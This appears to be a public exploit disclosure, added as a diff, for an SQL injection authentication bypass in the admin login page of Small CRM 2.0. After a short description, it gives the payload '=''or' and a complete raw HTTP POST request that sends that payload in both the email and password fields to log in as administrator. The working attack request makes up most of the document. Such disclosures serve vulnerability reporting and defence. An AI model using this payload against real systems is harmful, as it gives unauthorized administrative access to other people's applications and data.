@@ -1,0 +1,35 @@
+# Exploit Title: Small CRM 2.0 - Authentication Bypass
+# Google Dork: N/A
+# Date: 2020-01-02
+# Exploit Author: FULLSHADE
+# Vendor Homepage: https://phpgurukul.com/
+# Software Link: https://phpgurukul.com/small-crm-php/
+# Version: V2.0
+# Tested on: Windows
+# CVE : N/A
+
+# Description:
+#
+# There is a SQL injection vulnerability in the /index.php page
+# which allows for an attacker to use the SQLi login bypass payload
+# '=''or' for both the username and password parameters, this allows
+# for any authenticated or low level user to login to the admin account.
+
+========== 1. Authentication bypass ==========
+
+POST /Small%20CRM%20Projects%20Using%20PHP%20and%20MySQL/crm/admin/index.php HTTP/1.1
+Host: 10.0.0.214
+User-Agent: Mozilla/5.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 57
+Origin: http://10.0.0.214
+DNT: 1
+Connection: close
+Referer: http://10.0.0.214/Small%20CRM%20Projects%20Using%20PHP%20and%20MySQL/crm/admin/index.php
+Cookie: PHPSESSID=k5845lo7s90it5p33js75665jq
+Upgrade-Insecure-Requests: 1
+
+email=%27%3D%27%27or%27&password=%27%3D%27%27or%27&login=
